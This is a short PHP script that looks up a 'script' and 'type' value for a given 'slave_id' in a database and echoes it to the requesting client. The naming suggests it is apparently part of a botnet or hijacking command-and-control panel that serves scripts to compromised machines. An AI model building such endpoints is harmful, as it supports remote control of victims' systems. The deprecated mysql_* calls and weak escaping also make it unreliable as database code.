<?
include("../includes/configuration.inc.php");
include("../includes/mysql_connect.inc.php");
//-------------------------------------------
if(isset($_GET['client']))
{
$slave_id = $_GET['id'];
$slave_id = mysql_escape_string($slave_id);
//--------------------------------------
$querry_secs = "SELECT script, type FROM scripting WHERE slave_id='$slave_id'";
$result4 = mysql_query($querry_secs, $connect);
while($row = mysql_fetch_array($result4) ){
 $script = $row[0];
 $type = $row[1];
}
if(isset($_GET['script']))
{
echo $script;
}
elseif(isset($_GET['type']))
{
echo $type;
}
}
?>